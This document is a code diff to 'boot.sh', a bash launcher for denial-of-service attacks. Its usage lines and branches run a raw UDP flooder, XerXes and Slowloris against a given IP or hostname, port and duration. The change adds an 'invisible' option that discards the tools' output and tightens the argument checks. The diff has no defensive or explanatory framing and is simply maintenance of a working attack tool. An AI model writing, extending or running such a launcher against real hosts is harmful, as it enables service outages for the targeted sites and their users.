@@ -41,9 +41,9 @@ ${Color_Off}"
 echo ""
 echo -e "${IGreen}Welcome to Boot.sh;"
 echo ""
-echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size]${IGreen}"
-echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port] [time]${IGreen}"
-echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [time] [https or http]${Color_Off}"
+echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size] [invisible (1=yes, 0=no; default=0)]${IGreen}"
+echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port] [time] [invisible (1=yes, 0=no; default=0)]${IGreen}"
+echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [time] [https or http] [invisible (1=yes, 0=no; default=0)]${Color_Off}"
 echo ""
 if [ -z $1 ]
 	then
@@ -74,11 +74,14 @@ if [ $1 == 'rawudp' ]
 		echo ""
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
 		if [ -z $6 ]
+			then
+				perl u $2 $3 $5 $4
+		elif [ $6 -eq 0 ]
 			then	
 				perl u $2 $3 $5 $4
-		elif [ $6 == 'inv' ]
+		elif [ $6 -eq 1 ]
 			then
-				perl u $2 $3 $5 $4 > nul
+				perl u $2 $3 $5 $4 >/dev/null
 		else
 			exit
 		fi
@@ -103,11 +106,14 @@ if [ $1 == 'xerxes' ]
 		echo ""
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
 		if [ -z $5 ]
+			then
+				timeout $4 ./x $2 $3
+		elif [ $5 -eq 0 ]
 			then	
 				timeout $4 ./x $2 $3
-		elif [ $5 == 'inv' ]
+		elif [ $5 -eq 1 ]
 			then
-				timeout $4 ./x $2 $3 > nul
+				timeout $4 ./x $2 $3 >/dev/null
 		else
 			exit
 		fi
@@ -141,9 +147,12 @@ if [ $1 == 'slowloris' ]
 				if [ -z $6 ]
 					then	
 						timeout $4 perl s -dns $2 -port $3 -https
-				elif [ $6 == 'inv' ]
+				elif [ $6 -eq 0 ]
 					then
-						timeout $4 perl s -dns $2 -port $3 -https > nul
+						timeout $4 perl s -dns $2 -port $3 -https
+				elif [ $6 -eq 1 ]
+					then
+						timeout $4 perl s -dns $2 -port $3 -https >/dev/null
 				else
 					exit
 				fi
@@ -151,9 +160,12 @@ if [ $1 == 'slowloris' ]
 			if [ -z $6 ]
 				then	
 					timeout $4 perl s -dns $2 -port $3
-			elif [ $6 == 'inv' ]
+			elif [ $6 -eq 0 ]
 				then
-					timeout $4 perl s -dns $2 -port $3 > nul
+					timeout $4 perl s -dns $2 -port $3
+			elif [ $6 -eq 1 ]
+				then
+					timeout $4 perl s -dns $2 -port $3 >/dev/null
 			else
 				exit
 			fi
